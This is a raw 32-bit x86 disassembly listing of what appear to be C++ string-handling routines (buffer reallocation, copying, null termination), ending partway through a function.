  404827:	8b 74 24 24          	mov    0x24(%esp),%esi
  40482b:	83 fe ff             	cmp    $0xffffffff,%esi
  40482e:	0f 84 a1 00 00 00    	je     0x4048d5
  404834:	8b 7c 24 20          	mov    0x20(%esp),%edi
  404838:	8b 47 18             	mov    0x18(%edi),%eax
  40483b:	39 f0                	cmp    %esi,%eax
  40483d:	73 12                	jae    0x404851
  40483f:	83 ec 04             	sub    $0x4,%esp
  404842:	ff 77 14             	push   0x14(%edi)
  404845:	56                   	push   %esi
  404846:	57                   	push   %edi
  404847:	e8 9c 00 00 00       	call   0x4048e8
  40484c:	83 c4 10             	add    $0x10,%esp
  40484f:	eb 77                	jmp    0x4048c8
  404851:	83 fe 0f             	cmp    $0xf,%esi
  404854:	77 5a                	ja     0x4048b0
  404856:	8a 4c 24 28          	mov    0x28(%esp),%cl
  40485a:	84 c9                	test   %cl,%cl
  40485c:	74 52                	je     0x4048b0
  40485e:	8b 4f 14             	mov    0x14(%edi),%ecx
  404861:	39 f1                	cmp    %esi,%ecx
  404863:	89 f3                	mov    %esi,%ebx
  404865:	77 02                	ja     0x404869
  404867:	89 cb                	mov    %ecx,%ebx
  404869:	83 f8 10             	cmp    $0x10,%eax
  40486c:	72 31                	jb     0x40489f
  40486e:	8d 4f 04             	lea    0x4(%edi),%ecx
  404871:	8b 29                	mov    (%ecx),%ebp
  404873:	85 db                	test   %ebx,%ebx
  404875:	74 11                	je     0x404888
  404877:	83 ec 04             	sub    $0x4,%esp
  40487a:	53                   	push   %ebx
  40487b:	55                   	push   %ebp
  40487c:	51                   	push   %ecx
  40487d:	e8 9a d7 00 00       	call   0x41201c
  404882:	83 c4 10             	add    $0x10,%esp
  404885:	8b 47 18             	mov    0x18(%edi),%eax
  404888:	40                   	inc    %eax
  404889:	3d 00 10 00 00       	cmp    $0x1000,%eax
  40488e:	72 03                	jb     0x404893
  404890:	8b 6d fc             	mov    -0x4(%ebp),%ebp
  404893:	83 ec 0c             	sub    $0xc,%esp
  404896:	55                   	push   %ebp
  404897:	e8 90 1b 00 00       	call   0x40642c
  40489c:	83 c4 10             	add    $0x10,%esp
  40489f:	c7 47 18 0f 00 00 00 	movl   $0xf,0x18(%edi)
  4048a6:	89 5f 14             	mov    %ebx,0x14(%edi)
  4048a9:	c6 44 1f 04 00       	movb   $0x0,0x4(%edi,%ebx,1)
  4048ae:	eb 18                	jmp    0x4048c8
  4048b0:	85 f6                	test   %esi,%esi
  4048b2:	75 14                	jne    0x4048c8
  4048b4:	8d 4f 04             	lea    0x4(%edi),%ecx
  4048b7:	83 f8 10             	cmp    $0x10,%eax
  4048ba:	72 02                	jb     0x4048be
  4048bc:	8b 09                	mov    (%ecx),%ecx
  4048be:	c7 47 14 00 00 00 00 	movl   $0x0,0x14(%edi)
  4048c5:	c6 01 00             	movb   $0x0,(%ecx)
  4048c8:	85 f6                	test   %esi,%esi
  4048ca:	0f 95 c0             	setne  %al
  4048cd:	83 c4 0c             	add    $0xc,%esp
  4048d0:	5e                   	pop    %esi
  4048d1:	5f                   	pop    %edi
  4048d2:	5b                   	pop    %ebx
  4048d3:	5d                   	pop    %ebp
  4048d4:	c3                   	ret
  4048d5:	83 ec 0c             	sub    $0xc,%esp
  4048d8:	68 30 35 42 00       	push   $0x423530
  4048dd:	e8 b6 a3 00 00       	call   0x40ec98
  4048e2:	83 c4 0c             	add    $0xc,%esp
  4048e5:	90                   	nop
  4048e6:	90                   	nop
  4048e7:	90                   	nop
  4048e8:	55                   	push   %ebp
  4048e9:	89 e5                	mov    %esp,%ebp
  4048eb:	53                   	push   %ebx
  4048ec:	57                   	push   %edi
  4048ed:	56                   	push   %esi
  4048ee:	81 ec 8c 00 00 00    	sub    $0x8c,%esp
  4048f4:	8b 45 10             	mov    0x10(%ebp),%eax
  4048f7:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4048fa:	8b 55 08             	mov    0x8(%ebp),%edx
  4048fd:	89 55 f0             	mov    %edx,-0x10(%ebp)
  404900:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  404903:	89 45 e8             	mov    %eax,-0x18(%ebp)
  404906:	8b 75 ec             	mov    -0x14(%ebp),%esi
  404909:	83 ce 0f             	or     $0xf,%esi
  40490c:	8b 5d ec             	mov    -0x14(%ebp),%ebx
  40490f:	c7 45 90 98 13 42 00 	movl   $0x421398,-0x70(%ebp)
  404916:	c7 45 94 d8 36 42 00 	movl   $0x4236d8,-0x6c(%ebp)
  40491d:	89 6d 98             	mov    %ebp,-0x68(%ebp)
  404920:	89 65 a0             	mov    %esp,-0x60(%ebp)
  404923:	c7 45 98 d2 4a 40 00 	movl   $0x404ad2,-0x68(%ebp)
  40492a:	8d 85 74 ff ff ff    	lea    -0x8c(%ebp),%eax
  404930:	e8 cc d6 01 00       	call   0x422001
  404935:	83 fe ff             	cmp    $0xffffffff,%esi
  404938:	74 2e                	je     0x404968
  40493a:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40493d:	8b 48 18             	mov    0x18(%eax),%ecx
  404940:	89 cf                	mov    %ecx,%edi
  404942:	d1 ef                	shr    $1,%edi
  404944:	ba ab aa aa aa       	mov    $0xaaaaaaab,%edx
  404949:	89 f0                	mov    %esi,%eax
  40494b:	f7 e2                	mul    %edx
  40494d:	d1 ea                	shr    $1,%edx
  40494f:	39 d7                	cmp    %edx,%edi
  404951:	89 f3                	mov    %esi,%ebx
  404953:	76 13                	jbe    0x404968
  404955:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  40495a:	29 f8                	sub    %edi,%eax
  40495c:	39 c1                	cmp    %eax,%ecx
  40495e:	0f 87 59 01 00 00    	ja     0x404abd
  404964:	01 cf                	add    %ecx,%edi
  404966:	89 fb                	mov    %edi,%ebx
  404968:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40496b:	89 d8                	mov    %ebx,%eax
  40496d:	40                   	inc    %eax
  40496e:	74 41                	je     0x4049b1
  404970:	3d 00 10 00 00       	cmp    $0x1000,%eax
  404975:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  404978:	72 40                	jb     0x4049ba
  40497a:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40497d:	83 f8 dd             	cmp    $0xffffffdd,%eax
  404980:	0f 83 3a 01 00 00    	jae    0x404ac0
  404986:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404989:	8d 4b 24             	lea    0x24(%ebx),%ecx
  40498c:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40498f:	c7 85 7c ff ff ff 02 	movl   $0x2,-0x84(%ebp)
  404996:	00 00 00 
  404999:	89 0c 24             	mov    %ecx,(%esp)
  40499c:	e8 c7 67 00 00       	call   0x40b168
  4049a1:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4049a4:	89 c6                	mov    %eax,%esi
  4049a6:	83 c6 23             	add    $0x23,%esi
  4049a9:	83 e6 e0             	and    $0xffffffe0,%esi
  4049ac:	89 46 fc             	mov    %eax,-0x4(%esi)
  4049af:	eb 29                	jmp    0x4049da
  4049b1:	31 f6                	xor    %esi,%esi
  4049b3:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4049b8:	eb 23                	jmp    0x4049dd
  4049ba:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4049bd:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  4049c0:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  4049c3:	c7 85 7c ff ff ff 03 	movl   $0x3,-0x84(%ebp)
  4049ca:	00 00 00 
  4049cd:	89 04 24             	mov    %eax,(%esp)
  4049d0:	e8 93 67 00 00       	call   0x40b168
  4049d5:	89 c6                	mov    %eax,%esi
  4049d7:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  4049da:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4049dd:	89 75 cc             	mov    %esi,-0x34(%ebp)
  4049e0:	89 45 ac             	mov    %eax,-0x54(%ebp)
  4049e3:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  4049e6:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  4049ea:	74 32                	je     0x404a1e
  4049ec:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4049ef:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  4049f2:	83 c1 04             	add    $0x4,%ecx
  4049f5:	83 78 18 10          	cmpl   $0x10,0x18(%eax)
  4049f9:	89 4d c8             	mov    %ecx,-0x38(%ebp)
  4049fc:	72 07                	jb     0x404a05
  4049fe:	8b 45 c8             	mov    -0x38(%ebp),%eax
  404a01:	8b 00                	mov    (%eax),%eax
  404a03:	eb 03                	jmp    0x404a08
  404a05:	8b 45 c8             	mov    -0x38(%ebp),%eax
  404a08:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  404a0b:	8b 55 cc             	mov    -0x34(%ebp),%edx
  404a0e:	89 4c 24 08          	mov    %ecx,0x8(%esp)
  404a12:	89 44 24 04          	mov    %eax,0x4(%esp)
  404a16:	89 14 24             	mov    %edx,(%esp)
  404a19:	e8 fe d5 00 00       	call   0x41201c
  404a1e:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404a21:	8b 40 18             	mov    0x18(%eax),%eax
  404a24:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  404a27:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  404a2a:	83 f8 10             	cmp    $0x10,%eax
  404a2d:	72 25                	jb     0x404a54
  404a2f:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404a32:	8b 40 04             	mov    0x4(%eax),%eax
  404a35:	89 45 c0             	mov    %eax,-0x40(%ebp)
  404a38:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  404a3b:	40                   	inc    %eax
  404a3c:	3d 00 10 00 00       	cmp    $0x1000,%eax
  404a41:	8b 45 c0             	mov    -0x40(%ebp),%eax
  404a44:	72 06                	jb     0x404a4c
  404a46:	8b 45 c0             	mov    -0x40(%ebp),%eax
  404a49:	8b 40 fc             	mov    -0x4(%eax),%eax
  404a4c:	89 04 24             	mov    %eax,(%esp)
  404a4f:	e8 d8 19 00 00       	call   0x40642c
  404a54:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404a57:	c7 41 18 0f 00 00 00 	movl   $0xf,0x18(%ecx)
  404a5e:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404a61:	83 c0 04             	add    $0x4,%eax
  404a64:	89 45 bc             	mov    %eax,-0x44(%ebp)
  404a67:	8b 45 bc             	mov    -0x44(%ebp),%eax
  404a6a:	8b 55 f0             	mov    -0x10(%ebp),%edx
  404a6d:	c7 42 14 00 00 00 00 	movl   $0x0,0x14(%edx)
  404a74:	c6 00 00             	movb   $0x0,(%eax)
  404a77:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  404a7a:	8b 75 cc             	mov    -0x34(%ebp),%esi
  404a7d:	89 72 04             	mov    %esi,0x4(%edx)
  404a80:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  404a83:	8b 75 ac             	mov    -0x54(%ebp),%esi
  404a86:	89 72 18             	mov    %esi,0x18(%edx)
  404a89:	83 79 18 10          	cmpl   $0x10,0x18(%ecx)
  404a8d:	72 05                	jb     0x404a94
  404a8f:	8b 45 bc             	mov    -0x44(%ebp),%eax
  404a92:	8b 00                	mov    (%eax),%eax
  404a94:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404a97:	8b 55 e8             	mov    -0x18(%ebp),%edx
  404a9a:	89 51 14             	mov    %edx,0x14(%ecx)
  404a9d:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  404aa0:	c6 04 08 00          	movb   $0x0,(%eax,%ecx,1)
  404aa4:	8d 85 74 ff ff ff    	lea    -0x8c(%ebp),%eax
  404aaa:	89 04 24             	mov    %eax,(%esp)
  404aad:	e8 70 d5 01 00       	call   0x422022
  404ab2:	81 c4 8c 00 00 00    	add    $0x8c,%esp
  404ab8:	5e                   	pop    %esi
  404ab9:	5f                   	pop    %edi
  404aba:	5b                   	pop    %ebx
  404abb:	5d                   	pop    %ebp
  404abc:	c3                   	ret
  404abd:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404ac0:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  404ac3:	c7 85 7c ff ff ff 01 	movl   $0x1,-0x84(%ebp)
  404aca:	00 00 00 
  404acd:	e8 8e a1 00 00       	call   0x40ec60
  404ad2:	8b 85 78 ff ff ff    	mov    -0x88(%ebp),%eax
  404ad8:	3d 09 00 00 00       	cmp    $0x9,%eax
  404add:	0f 87 1f 01 00 00    	ja     0x404c02
  404ae3:	2d 01 00 00 00       	sub    $0x1,%eax
  404ae8:	ff 24 85 60 4c 40 00 	jmp    *0x404c60(,%eax,4)
  404aef:	8b 45 80             	mov    -0x80(%ebp),%eax
  404af2:	8b 4d 84             	mov    -0x7c(%ebp),%ecx
  404af5:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  404af8:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  404afb:	89 04 24             	mov    %eax,(%esp)
  404afe:	e8 65 b9 01 00       	call   0x420468
  404b03:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404b06:	40                   	inc    %eax
  404b07:	0f 84 23 01 00 00    	je     0x404c30
  404b0d:	3d 00 10 00 00       	cmp    $0x1000,%eax
  404b12:	0f 82 c5 00 00 00    	jb     0x404bdd
  404b18:	83 f8 dd             	cmp    $0xffffffdd,%eax
  404b1b:	0f 83 d2 00 00 00    	jae    0x404bf3
  404b21:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404b24:	83 c0 24             	add    $0x24,%eax
  404b27:	c7 85 7c ff ff ff 05 	movl   $0x5,-0x84(%ebp)
  404b2e:	00 00 00 
  404b31:	89 04 24             	mov    %eax,(%esp)
  404b34:	e8 2f 66 00 00       	call   0x40b168
  404b39:	e9 f6 00 00 00       	jmp    0x404c34
  404b3e:	8b 45 80             	mov    -0x80(%ebp),%eax
  404b41:	8b 4d 84             	mov    -0x7c(%ebp),%ecx
  404b44:	89 45 b0             	mov    %eax,-0x50(%ebp)
  404b47:	89 4d b4             	mov    %ecx,-0x4c(%ebp)
  404b4a:	c7 85 7c ff ff ff 08 	movl   $0x8,-0x84(%ebp)
  404b51:	00 00 00 
  404b54:	e8 7b b9 01 00       	call   0x4204d4
  404b59:	c7 85 7c ff ff ff 09 	movl   $0x9,-0x84(%ebp)
  404b60:	00 00 00 
  404b63:	e8 6c b9 01 00       	call   0x4204d4
  404b68:	e9 a8 00 00 00       	jmp    0x404c15
  404b6d:	8b 45 80             	mov    -0x80(%ebp),%eax
  404b70:	8b 4d 84             	mov    -0x7c(%ebp),%ecx
  404b73:	89 04 24             	mov    %eax,(%esp)
  404b76:	e8 ed b8 01 00       	call   0x420468
  404b7b:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404b7e:	8b 40 18             	mov    0x18(%eax),%eax
  404b81:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  404b84:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  404b87:	83 f8 10             	cmp    $0x10,%eax
  404b8a:	72 25                	jb     0x404bb1
  404b8c:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404b8f:	8b 40 04             	mov    0x4(%eax),%eax
  404b92:	89 45 d0             	mov    %eax,-0x30(%ebp)
  404b95:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  404b98:	40                   	inc    %eax
  404b99:	3d 00 10 00 00       	cmp    $0x1000,%eax
  404b9e:	8b 45 d0             	mov    -0x30(%ebp),%eax
  404ba1:	72 06                	jb     0x404ba9
  404ba3:	8b 45 d0             	mov    -0x30(%ebp),%eax
  404ba6:	8b 40 fc             	mov    -0x4(%eax),%eax
  404ba9:	89 04 24             	mov    %eax,(%esp)
  404bac:	e8 7b 18 00 00       	call   0x40642c
  404bb1:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404bb4:	c7 40 18 0f 00 00 00 	movl   $0xf,0x18(%eax)
  404bbb:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404bbe:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404bc1:	c7 41 14 00 00 00 00 	movl   $0x0,0x14(%ecx)
  404bc8:	c6 40 04 00          	movb   $0x0,0x4(%eax)
  404bcc:	c7 85 7c ff ff ff 07 	movl   $0x7,-0x84(%ebp)
  404bd3:	00 00 00 
  404bd6:	e8 19 b8 01 00       	call   0x4203f4
  404bdb:	eb 38                	jmp    0x404c15
  404bdd:	c7 85 7c ff ff ff 06 	movl   $0x6,-0x84(%ebp)
  404be4:	00 00 00 
  404be7:	89 04 24             	mov    %eax,(%esp)
  404bea:	e8 79 65 00 00       	call   0x40b168
  404bef:	89 c6                	mov    %eax,%esi
  404bf1:	eb 50                	jmp    0x404c43
  404bf3:	c7 85 7c ff ff ff 04 	movl   $0x4,-0x84(%ebp)
  404bfa:	00 00 00 
  404bfd:	e8 5e a0 00 00       	call   0x40ec60
  404c02:	0f 0b                	ud2
  404c04:	8b 45 80             	mov    -0x80(%ebp),%eax
  404c07:	8b 4d 84             	mov    -0x7c(%ebp),%ecx
  404c0a:	89 04 24             	mov    %eax,(%esp)
  404c0d:	e8 76 fa ff ff       	call   0x404688
  404c12:	83 ec 04             	sub    $0x4,%esp
  404c15:	8b 45 b0             	mov    -0x50(%ebp),%eax
  404c18:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
  404c1b:	c7 85 7c ff ff ff ff 	movl   $0xffffffff,-0x84(%ebp)
  404c22:	ff ff ff 
  404c25:	89 04 24             	mov    %eax,(%esp)
  404c28:	e8 73 d3 01 00       	call   0x421fa0
  404c2d:	83 ec 04             	sub    $0x4,%esp
  404c30:	31 f6                	xor    %esi,%esi
  404c32:	eb 0f                	jmp    0x404c43
  404c34:	89 45 b8             	mov    %eax,-0x48(%ebp)
  404c37:	8b 45 b8             	mov    -0x48(%ebp),%eax
  404c3a:	8d 70 23             	lea    0x23(%eax),%esi
  404c3d:	83 e6 e0             	and    $0xffffffe0,%esi
  404c40:	89 46 fc             	mov    %eax,-0x4(%esi)
  404c43:	c7 85 7c ff ff ff ff 	movl   $0xffffffff,-0x84(%ebp)
  404c4a:	ff ff ff 
  404c4d:	e8 82 b8 01 00       	call   0x4204d4
  404c52:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404c55:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  404c58:	e9 80 fd ff ff       	jmp    0x4049dd
  404c5d:	0f 1f 00             	nopl   (%eax)
  404c60:	ef                   	out    %eax,(%dx)
  404c61:	4a                   	dec    %edx
  404c62:	40                   	inc    %eax
  404c63:	00 ef                	add    %ch,%bh
  404c65:	4a                   	dec    %edx
  404c66:	40                   	inc    %eax
  404c67:	00 ef                	add    %ch,%bh
  404c69:	4a                   	dec    %edx
  404c6a:	40                   	inc    %eax
  404c6b:	00 6d 4b             	add    %ch,0x4b(%ebp)
  404c6e:	40                   	inc    %eax
  404c6f:	00 6d 4b             	add    %ch,0x4b(%ebp)
  404c72:	40                   	inc    %eax
  404c73:	00 6d 4b             	add    %ch,0x4b(%ebp)
  404c76:	40                   	inc    %eax
  404c77:	00 3e                	add    %bh,(%esi)
  404c79:	4b                   	dec    %ebx
  404c7a:	40                   	inc    %eax
  404c7b:	00 04 4c             	add    %al,(%esp,%ecx,2)
  404c7e:	40                   	inc    %eax
  404c7f:	00 04 4c             	add    %al,(%esp,%ecx,2)
  404c82:	40                   	inc    %eax
  404c83:	00 55 53             	add    %dl,0x53(%ebp)
  404c86:	57                   	push   %edi
  404c87:	56                   	push   %esi
  404c88:	83 ec 0c             	sub    $0xc,%esp
  404c8b:	8b 7c 24 24          	mov    0x24(%esp),%edi
  404c8f:	8b 74 24 20          	mov    0x20(%esp),%esi
  404c93:	8d 5f ff             	lea    -0x1(%edi),%ebx
  404c96:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 nopw %cs:0x0(%eax,%eax,1)
  404c9d:	1f 84 00 00 00 00 00 
  404ca4:	80 7b 01 00          	cmpb   $0x0,0x1(%ebx)
  404ca8:	8d 5b 01             	lea    0x1(%ebx),%ebx
  404cab:	75 f7                	jne    0x404ca4
  404cad:	29 fb                	sub    %edi,%ebx
  404caf:	85 ff                	test   %edi,%edi
  404cb1:	74 39                	je     0x404cec
  404cb3:	8b 46 18             	mov    0x18(%esi),%eax
  404cb6:	8d 6e 04             	lea    0x4(%esi),%ebp
  404cb9:	83 f8 10             	cmp    $0x10,%eax
  404cbc:	72 11                	jb     0x404ccf
  404cbe:	8b 4d 00             	mov    0x0(%ebp),%ecx
  404cc1:	39 f9                	cmp    %edi,%ecx
  404cc3:	77 27                	ja     0x404cec
  404cc5:	83 f8 10             	cmp    $0x10,%eax
  404cc8:	72 0d                	jb     0x404cd7
  404cca:	8b 55 00             	mov    0x0(%ebp),%edx
  404ccd:	eb 0a                	jmp    0x404cd9
  404ccf:	89 e9                	mov    %ebp,%ecx
  404cd1:	39 f9                	cmp    %edi,%ecx
  404cd3:	76 f0                	jbe    0x404cc5
  404cd5:	eb 15                	jmp    0x404cec
  404cd7:	89 ea                	mov    %ebp,%edx
  404cd9:	8b 4e 14             	mov    0x14(%esi),%ecx
  404cdc:	01 ca                	add    %ecx,%edx
  404cde:	39 fa                	cmp    %edi,%edx
  404ce0:	76 0a                	jbe    0x404cec
  404ce2:	83 f8 10             	cmp    $0x10,%eax
  404ce5:	72 5d                	jb     0x404d44
  404ce7:	8b 55 00             	mov    0x0(%ebp),%edx
  404cea:	eb 5a                	jmp    0x404d46
  404cec:	83 ec 04             	sub    $0x4,%esp
  404cef:	6a 00                	push   $0x0
  404cf1:	53                   	push   %ebx
  404cf2:	56                   	push   %esi
  404cf3:	e8 28 fb ff ff       	call   0x404820
  404cf8:	83 c4 10             	add    $0x10,%esp
  404cfb:	84 c0                	test   %al,%al
  404cfd:	74 3b                	je     0x404d3a
  404cff:	8b 46 18             	mov    0x18(%esi),%eax
  404d02:	8d 6e 04             	lea    0x4(%esi),%ebp
  404d05:	83 f8 10             	cmp    $0x10,%eax
  404d08:	72 09                	jb     0x404d13
  404d0a:	8b 4d 00             	mov    0x0(%ebp),%ecx
  404d0d:	85 db                	test   %ebx,%ebx
  404d0f:	75 08                	jne    0x404d19
  404d11:	eb 17                	jmp    0x404d2a
  404d13:	89 e9                	mov    %ebp,%ecx
  404d15:	85 db                	test   %ebx,%ebx
  404d17:	74 11                	je     0x404d2a
  404d19:	83 ec 04             	sub    $0x4,%esp
  404d1c:	53                   	push   %ebx
  404d1d:	57                   	push   %edi
  404d1e:	51                   	push   %ecx
  404d1f:	e8 f8 d2 00 00       	call   0x41201c
  404d24:	83 c4 10             	add    $0x10,%esp
  404d27:	8b 46 18             	mov    0x18(%esi),%eax
  404d2a:	83 f8 10             	cmp    $0x10,%eax
  404d2d:	72 03                	jb     0x404d32
  404d2f:	8b 6d 00             	mov    0x0(%ebp),%ebp
  404d32:	89 5e 14             	mov    %ebx,0x14(%esi)
  404d35:	c6 44 1d 00 00       	movb   $0x0,0x0(%ebp,%ebx,1)
  404d3a:	89 f0                	mov    %esi,%eax
  404d3c:	83 c4 0c             	add    $0xc,%esp
  404d3f:	5e                   	pop    %esi
  404d40:	5f                   	pop    %edi
  404d41:	5b                   	pop    %ebx
  404d42:	5d                   	pop    %ebp
  404d43:	c3                   	ret
  404d44:	89 ea                	mov    %ebp,%edx
  404d46:	29 d7                	sub    %edx,%edi
  404d48:	89 ca                	mov    %ecx,%edx
  404d4a:	29 fa                	sub    %edi,%edx
  404d4c:	0f 82 81 00 00 00    	jb     0x404dd3
  404d52:	39 da                	cmp    %ebx,%edx
  404d54:	77 02                	ja     0x404d58
  404d56:	89 d3                	mov    %edx,%ebx
  404d58:	01 fb                	add    %edi,%ebx
  404d5a:	39 d9                	cmp    %ebx,%ecx
  404d5c:	0f 82 81 00 00 00    	jb     0x404de3
  404d62:	83 f8 0f             	cmp    $0xf,%eax
  404d65:	77 04                	ja     0x404d6b
  404d67:	89 e8                	mov    %ebp,%eax
  404d69:	eb 03                	jmp    0x404d6e
  404d6b:	8b 46 04             	mov    0x4(%esi),%eax
  404d6e:	89 5e 14             	mov    %ebx,0x14(%esi)
  404d71:	c6 04 18 00          	movb   $0x0,(%eax,%ebx,1)
  404d75:	8b 5e 14             	mov    0x14(%esi),%ebx
  404d78:	39 fb                	cmp    %edi,%ebx
  404d7a:	76 3e                	jbe    0x404dba
  404d7c:	85 ff                	test   %edi,%edi
  404d7e:	74 ba                	je     0x404d3a
  404d80:	8b 46 04             	mov    0x4(%esi),%eax
  404d83:	8b 4e 18             	mov    0x18(%esi),%ecx
  404d86:	83 f9 0f             	cmp    $0xf,%ecx
  404d89:	89 c2                	mov    %eax,%edx
  404d8b:	77 02                	ja     0x404d8f
  404d8d:	89 ea                	mov    %ebp,%edx
  404d8f:	29 fb                	sub    %edi,%ebx
  404d91:	74 16                	je     0x404da9
  404d93:	01 d7                	add    %edx,%edi
  404d95:	83 ec 04             	sub    $0x4,%esp
  404d98:	53                   	push   %ebx
  404d99:	57                   	push   %edi
  404d9a:	52                   	push   %edx
  404d9b:	e8 95 d3 00 00       	call   0x412135
  404da0:	83 c4 10             	add    $0x10,%esp
  404da3:	8b 46 04             	mov    0x4(%esi),%eax
  404da6:	8b 4e 18             	mov    0x18(%esi),%ecx
  404da9:	83 f9 0f             	cmp    $0xf,%ecx
  404dac:	77 02                	ja     0x404db0
  404dae:	89 e8                	mov    %ebp,%eax
  404db0:	89 5e 14             	mov    %ebx,0x14(%esi)
  404db3:	01 d8                	add    %ebx,%eax
  404db5:	c6 00 00             	movb   $0x0,(%eax)
  404db8:	eb 80                	jmp    0x404d3a
  404dba:	83 7e 18 0f          	cmpl   $0xf,0x18(%esi)
  404dbe:	76 03                	jbe    0x404dc3
  404dc0:	8b 6e 04             	mov    0x4(%esi),%ebp
  404dc3:	c7 46 14 00 00 00 00 	movl   $0x0,0x14(%esi)
  404dca:	c6 45 00 00          	movb   $0x0,0x0(%ebp)
  404dce:	e9 67 ff ff ff       	jmp    0x404d3a
  404dd3:	83 ec 0c             	sub    $0xc,%esp
  404dd6:	68 18 35 42 00       	push   $0x423518
  404ddb:	e8 a4 a0 00 00       	call   0x40ee84
  404de0:	83 c4 0c             	add    $0xc,%esp
  404de3:	83 ec 0c             	sub    $0xc,%esp
  404de6:	68 18 35 42 00       	push   $0x423518
  404deb:	e8 94 a0 00 00       	call   0x40ee84
  404df0:	83 c4 0c             	add    $0xc,%esp
  404df3:	90                   	nop
  404df4:	55                   	push   %ebp
  404df5:	89 e5                	mov    %esp,%ebp
  404df7:	53                   	push   %ebx
  404df8:	57                   	push   %edi
  404df9:	56                   	push   %esi
  404dfa:	83 ec 6c             	sub    $0x6c,%esp
  404dfd:	8b 75 0c             	mov    0xc(%ebp),%esi
  404e00:	8b 45 08             	mov    0x8(%ebp),%eax
  404e03:	89 45 f0             	mov    %eax,-0x10(%ebp)
  404e06:	c7 45 b0 98 13 42 00 	movl   $0x421398,-0x50(%ebp)
  404e0d:	c7 45 b4 14 37 42 00 	movl   $0x423714,-0x4c(%ebp)
  404e14:	89 6d b8             	mov    %ebp,-0x48(%ebp)
  404e17:	89 65 c0             	mov    %esp,-0x40(%ebp)
  404e1a:	c7 45 b8 14 4f 40 00 	movl   $0x404f14,-0x48(%ebp)
  404e21:	8d 45 94             	lea    -0x6c(%ebp),%eax
  404e24:	e8 d8 d1 01 00       	call   0x422001
  404e29:	3b 75 10             	cmp    0x10(%ebp),%esi
  404e2c:	0f 84 ab 00 00 00    	je     0x404edd
  404e32:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404e35:	83 c0 04             	add    $0x4,%eax
  404e38:	89 45 ec             	mov    %eax,-0x14(%ebp)
  404e3b:	66 0f 1f 84 00 00 00 	nopw   0x0(%eax,%eax,1)
  404e42:	00 00 
  404e44:	89 75 d4             	mov    %esi,-0x2c(%ebp)
  404e47:	0f be 06             	movsbl (%esi),%eax
  404e4a:	89 45 e8             	mov    %eax,-0x18(%ebp)
  404e4d:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404e50:	8b 40 14             	mov    0x14(%eax),%eax
  404e53:	83 f8 fe             	cmp    $0xfffffffe,%eax
  404e56:	0f 83 94 00 00 00    	jae    0x404ef0
  404e5c:	89 45 e0             	mov    %eax,-0x20(%ebp)
  404e5f:	8d 48 01             	lea    0x1(%eax),%ecx
  404e62:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404e65:	c7 45 9c 02 00 00 00 	movl   $0x2,-0x64(%ebp)
  404e6c:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  404e6f:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  404e73:	89 04 24             	mov    %eax,(%esp)
  404e76:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  404e7d:	00 
  404e7e:	e8 75 01 00 00       	call   0x404ff8
  404e83:	84 c0                	test   %al,%al
  404e85:	8b 75 d4             	mov    -0x2c(%ebp),%esi
  404e88:	74 49                	je     0x404ed3
  404e8a:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404e8d:	8b 40 14             	mov    0x14(%eax),%eax
  404e90:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404e93:	83 79 18 08          	cmpl   $0x8,0x18(%ecx)
  404e97:	72 1b                	jb     0x404eb4
  404e99:	8b 55 ec             	mov    -0x14(%ebp),%edx
  404e9c:	8b 0a                	mov    (%edx),%ecx
  404e9e:	8b 7d e8             	mov    -0x18(%ebp),%edi
  404ea1:	66 89 3c 41          	mov    %di,(%ecx,%eax,2)
  404ea5:	8b 02                	mov    (%edx),%eax
  404ea7:	eb 17                	jmp    0x404ec0
